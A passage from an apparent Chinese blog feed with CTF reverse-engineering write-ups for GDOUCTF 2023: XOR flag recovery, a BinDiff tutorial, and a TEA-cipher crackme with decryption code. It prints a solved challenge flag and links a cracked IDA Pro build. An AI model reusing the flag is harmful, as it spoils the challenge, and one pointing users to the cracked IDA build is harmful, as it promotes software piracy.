builtin">buffer</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>          tmp <span class="token operator">=</span> <span class="token builtin">buffer</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">^</span> key  <span class="token comment"># 逐个与key异或  </span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span>  <span class="token comment"># 对应的字符存入flag  </span>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>      <span class="token keyword">if</span> <span class="token string">'HZCTF'</span> <span class="token keyword">in</span> flag <span class="token keyword">or</span> <span class="token string">'NSSCTF'</span> <span class="token keyword">in</span> flag<span class="token punctuation">:</span>  <span class="token comment"># 只输出包含'HZCTF'或'NSSCTF'的结果  </span>        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h3><blockquote><p>发现官方 Writeup 有一种更方便地将一组小端序数据合并成一个正序数据的方法，记录一下<br>（<strong>但也有一个缺点，无法自己随意控制数据的长度，只能统一为相同长度</strong>）</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> struct    stack_bytes <span class="token operator">=</span> <span class="token punctuation">[</span>      <span class="token number">0x7d2e370a180f1604</span><span class="token punctuation">,</span>      <span class="token number">0x3f7d132a2a252822</span><span class="token punctuation">,</span>      <span class="token number">0x392a7f3f39132d13</span><span class="token punctuation">,</span>      <span class="token number">0x31207c7c381320</span>  <span class="token punctuation">]</span>    <span class="token comment"># 将stack_bytes中的数据按照小端字节序打包为二进制数据  </span>xored_bytes <span class="token operator">=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">"&lt;4Q"</span><span class="token punctuation">,</span> <span class="token operator">*</span>stack_bytes<span class="token punctuation">)</span>  <span class="token comment"># 其中，&lt; 表示小端序，Q代表一个无符号长整型  </span><span class="token comment"># 每个无符号长整型整数占8个字节，所以总共打包出来的字符串长度为32个字节  </span><span class="token comment"># b'\x04\x16\x0f\x18\n7.&#125;"(%**\x13&#125;?\x13-\x139?\x7f*9 \x138|| 1\x00'  </span>  <span class="token keyword">for</span> xorkey <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      output <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>byte <span class="token operator">^</span> xorkey <span class="token keyword">for</span> byte <span class="token keyword">in</span> xored_bytes<span class="token punctuation">)</span>      <span class="token keyword">if</span> <span class="token string">b"HZCTF&#123;"</span> <span class="token keyword">in</span> output<span class="token punctuation">:</span>          <span class="token keyword">print</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span>    <span class="token comment"># b'HZCTF&#123;b1ndiff_1s_a_us3ful_t00l&#125;L'  </span><span class="token comment"># （因为在lmao4的高位补了一个0，所以多输出了一个L）</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>NSSCTF{b1ndiff_1s_a_us3ful_t00l}<br>（最终要求将 HZCTF 改为 NSSCTF）</p></blockquote><p><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/GDOUCTF2023-L%21S%217.png" alt="GDOUCTF2023-L!S!7.png"></p>]]></content>
    
    
    <summary type="html">2023 GDOUCTF 比赛的一道逆向题，考察使用 BinDiff 插件查找两个程序的函数差异</summary>
    
    
    
    <category term="逆向" scheme="https://www.4ss1du0us.cn/categories/%E9%80%86%E5%90%91/"/>
    
    
    <category term="CTF刷题" scheme="https://www.4ss1du0us.cn/tags/CTF%E5%88%B7%E9%A2%98/"/>
    
    <category term="REVERSE" scheme="https://www.4ss1du0us.cn/tags/REVERSE/"/>
    
  </entry>
  
  <entry>
    <title>二进制文件相似性</title>
    <link href="https://www.4ss1du0us.cn/2023/0411cad674.html"/>
    <id>https://www.4ss1du0us.cn/2023/0411cad674.html</id>
    <published>2023-04-21T09:23:13.000Z</published>
    <updated>2023-05-14T02:13:45.662Z</updated>
    
    <content type="html"><![CDATA[<h2 id="BinDiff"><a href="#BinDiff" class="headerlink" title="BinDiff"></a>BinDiff</h2><blockquote><p>BinDiff 是一款二进制文件比对工具，可帮助漏洞研究人员和工程师快速找到反汇编代码的异同，同时，使用 BinDiff 还可以识别和隔离供应商提供的补丁中的漏洞修复</p></blockquote><hr><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><ol><li><p>BinDiff 是一款 java 程序，因此需要安装 <a href="https://www.oracle.com/java/technologies/downloads/#java8-windows">java jdk</a> 环境，用 <code>java -version</code> 验证安装是否成功</p></li><li><p>BinDiff 需要借助 IDA pro 进行分析，所以需要安装 <a href="https://www.52pojie.cn/thread-1584115-1-1.html">IDA Pro 7.7.220118 (SP1) 全插件绿色版</a> （官方说明需要 6.8 及以上版本）</p></li><li><p><a href="https://www.zynamics.com/software.html">下载 BinDiff</a> （BinDiff 同时支持 Windows、Linux、Mac）<br>Windows 平台选择 <code>bindiffx.msi</code> 下载<br>像平时安装软件一样正常安装即可（<strong>低版本的 BinDiff 可能需要手动选择 IDA pro 的安装路径，否则 BinDiff 无法正常运行</strong>）</p></li></ol><hr><h3 id="在-BinDiff-中使用"><a href="#在-BinDiff-中使用" class="headerlink" title="在 BinDiff 中使用"></a>在 BinDiff 中使用</h3><blockquote><p>注意，BinDiff 并不能直接分析 exe 程序，只能分析 IDA 生成的 <code>.i64</code> 数据库文件</p></blockquote><ol><li><p>将想要对比相似性的两个二进制程序分别用 IDA 打开，待 IDA 分析完成后，关闭 IDA，IDA 会在本地生成一个数据库文件</p></li><li><p>在 BinDiff 中 <code>主菜单 ——&gt; File ——&gt; New Workspace</code> 新建一个工作空间<br>然后 <code>主菜单 ——&gt; Diffs ——&gt; New Diff</code>，选择生成的两个 IDA 数据库文件，待分析完成即可</p></li><li><p><strong>我就是这样操作的，但是会有一个报错，暂时还没有解决报错问题。。。</strong></p></li><li><p>如果你的情况跟我一样，那就试试下面的方法吧</p></li></ol><hr><h3 id="在-IDA-中使用"><a href="#在-IDA-中使用" class="headerlink" title="在 IDA 中使用"></a>在 IDA 中使用</h3><blockquote><p>如果还是报错，可以直接在 IDA 中使用 BinDiff 插件</p></blockquote><ol><li><p><strong>因为在安装 BinDiff 时，选择了本地正确的 IDA 安装目录，BinDiff 会把插件放在 IDA 的安装目录下的 plugins 文件夹里</strong>，如图：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E7%9B%B8%E4%BC%BC%E6%80%A72.png" alt="二进制文件相似性2.png"><br>（如果没有的话，其实 <a href="https://www.52pojie.cn/thread-1584115-1-1.html">IDA Pro 7.7.220118 (SP1) 全插件绿色版</a> 这个版本的 IDA 是内置了 BinDiff 的，可以直接使用）</p></li><li><p>打开其中一个 IDA 数据库文件，在 IDA 中使用快捷键：<code>Ctrl + 6</code><br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E7%9B%B8%E4%BC%BC%E6%80%A71.png" alt="二进制文件相似性1.png"><br>点击 <code>Diff Database...</code>，然后选择另外一个二进制程序的 IDA 数据库文件<br>待分析完成，界面如下：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E7%9B%B8%E4%BC%BC%E6%80%A73.png" alt="二进制文件相似性3.png"><br>到此，说明插件安装成功</p></li><li><p>左边绿色框中，<code>Similarity</code> 的值表示两个文件中函数的相似度，值越接近 1 表示越相似</p></li></ol>]]></content>
    
    
    <summary type="html">做逆向时遇到给出多个可执行文件，需要对比文件之间的差异性时，可以使用 Bindiff 进行操作</summary>
    
    
    
    <category term="逆向" scheme="https://www.4ss1du0us.cn/categories/%E9%80%86%E5%90%91/"/>
    
    
    <category term="CTF笔记" scheme="https://www.4ss1du0us.cn/tags/CTF%E7%AC%94%E8%AE%B0/"/>
    
    <category term="REVERSE" scheme="https://www.4ss1du0us.cn/tags/REVERSE/"/>
    
  </entry>
  
  <entry>
    <title>【GDOUCTF 2023】Tea</title>
    <link href="https://www.4ss1du0us.cn/2023/043d789eff.html"/>
    <id>https://www.4ss1du0us.cn/2023/043d789eff.html</id>
    <published>2023-04-21T04:36:01.000Z</published>
    <updated>2023-06-07T12:29:48.662Z</updated>
    
    <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><code>tea</code> 算法的加密解密</li></ul><hr><p><a href="https://www.nssctf.cn/contest/82/">（2023年4月16日）【GDOUCTF 2023】Tea</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>解压得到一个 <code>teaaaa.exe</code> 程序，试运行：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/2023GDOUCTF-tea1.png" alt="2023GDOUCTF-tea1.png"><br>给出了提示，让我们输入十六进制数据来获得 flag</p></li><li><p>用 64 位 IDA 打开，由于没有 <code>main()</code> 函数，查看字符串：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/2023GDOUCTF-tea2.png" alt="2023GDOUCTF-tea2.png"><br>可以看到上面是程序的输出<br>注意到下面有一句提示：<code>fault!\nYou can go online and learn the tea algorithm!</code><br>定位过去，在 <code>sub_140016230()</code> 函数中：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/2023GDOUCTF-tea3.png" alt="2023GDOUCTF-tea3.png"><br>观察形式，<code>v6</code> 的值决定了用户的输入是否正确，跟进一下 <code>sub_140011352(v8)</code> 函数，发现 <code>sub_140011352(v8)</code> 会执行 <code>sub_140011B60(a1)</code> 函数：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/2023GDOUCTF-tea4.png" alt="2023GDOUCTF-tea4.png"><br>后面的一个 <code>for</code> 循环用来校验 <code>*(a1 + 4 * j)</code> 的值是否与 <code>v8[j]</code> 中的值相等<br>只有当每一个值都相同时，<code>v7</code> 才会一直保持非 0，于是返回一个非 0 值给 <code>v6</code>，就输入正确<br>（<strong>不过这里的逻辑貌似有点 bug，其实只需要 a1 的最后一个值与 v8 的最后一个值相等即可</strong>）<br>所以这其实是一个 <code>check()</code> 函数</p></li><li><p>注意到 <code>check</code> 失败的时候会提示我们去了解一下 <code>tea</code> 算法：</p></li></ol><blockquote><p>TEA 算法最初是由剑桥计算机实验室的 David Wheeler 和 Roger Needham 在 1994 年设计的。 TEA 算法使用 64 位的明文分组和 128 位的密钥，它使用 Feistel 分组加密框架，需要进行 64 轮迭代，尽管作者认为 32 轮已经足够了</p><p>该算法使用了一个神秘常数 <code>δ（Delta）</code> 作为倍数，它来源于黄金比率，以保证每一轮加密都不相同。但 <code>δ（Delta）</code> 的精确值似乎并不重要，这里 TEA 把它定义为 <code>δ =「(√5 - 1)231」</code>（也就是程序中的 <code>0x9e3779b9</code>）</p></blockquote><ul><li>网上找的 <code>tea</code> 算法加解密源码如下：</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DELTA</span> <span class="token expression"><span class="token number">0x9e3779b9</span></span></span><span class="token keyword">void</span> <span class="token function">tea_encrypt</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token operator">*</span> v<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token operator">*</span> key<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> l <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> r <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">32</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// 进行32次迭代加密，Tea算法作者的建议迭代次数</span>  <span class="token comment">// 利用多次双位移和异或将明文与密钥扩散混乱，并将两个明文互相加密</span>    l <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>r <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>r <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> r<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>sum <span class="token operator">+</span> key<span class="token punctuation">[</span>sum <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    sum <span class="token operator">+=</span> DELTA<span class="token punctuation">;</span>  <span class="token comment">// 累加Delta的值</span>    r <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>l <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>l <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> l<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>sum <span class="token operator">+</span> key<span class="token punctuation">[</span><span class="token punctuation">(</span>sum <span class="token operator">>></span> <span class="token number">11</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> l<span class="token punctuation">;</span>  v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> r<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">tea_decrypt</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token operator">*</span> v<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token operator">*</span> key<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> l <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> r <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  sum <span class="token operator">=</span> DELTA <span class="token operator">*</span> <span class="token number">32</span><span class="token punctuation">;</span>  <span class="token comment">// 32次迭代累加后delta的值</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">32</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    r <span class="token operator">-=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>l <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>l <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> l<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>sum <span class="token operator">+</span> key<span class="token punctuation">[</span><span class="token punctuation">(</span>sum <span class="token operator">>></span> <span class="token number">11</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    sum <span class="token operator">-=</span> DELTA<span class="token punctuation">;</span>    l <span class="token operator">-=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>r <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>r <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> r<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>sum <span class="token operator">+</span> key<span class="token punctuation">[</span>sum <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> l<span class="token punctuation">;</span>  v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> r<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token keyword">const</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> key<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token number">0x00010203</span><span class="token punctuation">,</span> <span class="token number">0x04050607</span><span class="token punctuation">,</span> <span class="token number">0x08090a0b</span><span class="token punctuation">,</span> <span class="token number">0x0c0d0e0f</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0xaabbccdd</span><span class="token punctuation">,</span> <span class="token number">0x01234567</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token function">tea_encrypt</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"tea_encrypt:%x %x\n"</span><span class="token punctuation">,</span> v1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> v1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">tea_decrypt</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"tea_decrypt:%x %x\n"</span><span class="token punctuation">,</span> v1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> v1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><strong><code>tea</code> 算法最关键的是要找到 <code>δ（Delta）</code> 的值和 128 位的 <code>key</code></strong></p><p>在逆向程序的时候，可以利用 IDA 的插件 <code>Findcrypt</code> 识别 <code>tea</code> 算法（有时可能不成功）</p></blockquote><ol start="4"><li><p>回到 <code>sub_140016230()</code> 函数中，关键在 <code>if ( v6 )</code> 判断之前的这部分：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/2023GDOUCTF-tea5.png" alt="2023GDOUCTF-tea5.png"><br>① 根据形式和程序的输出，<code>sub_1400111FE(&quot;%x&quot;, &amp;v8[j])</code> 应该是一个 <code>scanf()</code> 函数，让用户输入十六进制的数据，共需要输入 10 个<br>② 初始时：<br><code>v7[0] = 1234</code><br><code>v7[1] = 5678</code><br><code>v7[2] = 9012</code><br><code>v7[3] = 3456</code><br>③ 后面的 <code>sub_140011339(v7)</code> 函数会调用 <code>sub_1400117D0(a1)</code> 函数，改变了 <code>v7</code> 中的值：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/2023GDOUCTF-tea6.png" alt="2023GDOUCTF-tea6.png"><br>④ 修改后：<br><code>v7[0] = 2233</code><br><code>v7[1] = 4455</code><br><code>v7[2] = 6677</code><br><code>v7[3] = 8899</code></p></li><li><p>函数 <code>sub_140011145(v8, v9)</code> 会调用 <code>sub_140012030(a1, a2)</code> 实现 <code>v8</code> 往 <code>v9</code> 复制的操作，但是注意到后面并没有用到 <code>v9</code>，于是不管</p></li><li><p>跟进 <code>sub_1400112B7(v8, v7)</code> 函数，会执行 <code>sub_140011900(a1, a2)</code>：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/2023GDOUCTF-tea7.png" alt="2023GDOUCTF-tea7.png"><br>根据前面的了解，这个应该就是 <code>tea</code> 算法的实现了</p></li><li><p><strong>接下来重点就是要找出 <code>tea</code> 算法中  <code>δ（Delta）</code> 的值和 128 位的 <code>key</code>，以及密文了</strong><br>① 前面通过 <code>check()</code> 函数可知，check 是将用户输入与这一段数据进行校验：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/2023GDOUCTF-tea8.png" alt="2023GDOUCTF-tea8.png"><br>那么这些数据肯定就是 <code>tea</code> 算法加密后的密文了<br>② 注意实现 <code>tea</code> 算法的函数 <code>sub_1400112B7(v8, v7)</code> 的传参是 <code>v7</code> 和 <code>v8</code><br>而 <code>v8</code> 是用户的输入，也就是明文，那剩下的一个 <code>v7</code> 必然就是加密的 <code>key</code> 了：<br><code>v7[0] = 2233</code><br><code>v7[1] = 4455</code><br><code>v7[2] = 6677</code><br><code>v7[3] = 8899</code><br>每个 <code>v7[]</code> 有 32 位，四个正好 128 位<br>③ 最后，注意到 <code>tea</code> 算法的加密过程会有一个操作是： <code>sum += DELTA</code> 累加 <code>Delta</code> 的值<br>结合 IDA 给出的伪代码，<code>Delta = 256256256</code></p></li><li><p>剩下的就是根据逻辑写出解密的脚本了<br>形式好像跟网上介绍的 <code>tea</code> 算法不一样，可能有魔改，直接用原版貌似跑不出来<br>所以可以<em>直接基于 IDA 的伪代码进行改写</em></p></li></ol><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span>  </span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>  <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DELTA</span> <span class="token expression"><span class="token number">256256256</span>  </span></span>  <span class="token keyword">void</span> <span class="token function">sub_1400117D0</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token operator">*</span>a1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token keyword">int</span> v6 <span class="token operator">=</span> <span class="token number">2233</span><span class="token punctuation">;</span>      <span class="token keyword">int</span> v7 <span class="token operator">=</span> <span class="token number">4455</span><span class="token punctuation">;</span>      <span class="token keyword">int</span> v8 <span class="token operator">=</span> <span class="token number">6677</span><span class="token punctuation">;</span>      <span class="token keyword">int</span> v9 <span class="token operator">=</span> <span class="token number">8899</span><span class="token punctuation">;</span>      <span class="token operator">*</span>a1 <span class="token operator">=</span> <span class="token number">2233</span><span class="token punctuation">;</span>      a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> v7<span class="token punctuation">;</span>      a1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> v8<span class="token punctuation">;</span>      a1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> v9<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>    <span class="token keyword">void</span> <span class="token function">tea_decrypt</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token operator">*</span>a1<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token operator">*</span>a2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">int</span> v5<span class="token punctuation">,</span> v6<span class="token punctuation">,</span> v3<span class="token punctuation">;</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">--</span>i<span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>          v5 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>          v6 <span class="token operator">=</span> <span class="token number">256256256</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          v3 <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>          <span class="token keyword">do</span>        <span class="token punctuation">&#123;</span>              <span class="token operator">++</span>v5<span class="token punctuation">;</span>              a1<span class="token punctuation">[</span>v3<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token punctuation">(</span>v6 <span class="token operator">+</span> a2<span class="token punctuation">[</span><span class="token punctuation">(</span>v6 <span class="token operator">>></span> <span class="token number">11</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>a1<span class="token punctuation">[</span>i<span class="token punctuation">]</span>                                                           <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>a1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                a1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-=</span> v6 <span class="token operator">^</span> <span class="token punctuation">(</span>a1<span class="token punctuation">[</span>v3<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>a1<span class="token punctuation">[</span>v3<span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span>v3<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>v6 <span class="token operator">+</span> a2<span class="token punctuation">[</span>v6 <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                v6 <span class="token operator">-=</span> <span class="token number">256256256</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>          <span class="token keyword">while</span> <span class="token punctuation">(</span> v5 <span class="token operator">&lt;=</span> <span class="token number">0x20</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">int</span> v5 <span class="token operator">=</span> <span class="token number">32</span><span class="token punctuation">;</span>      <span class="token keyword">int</span> v6 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">int</span> v9<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span><span class="token 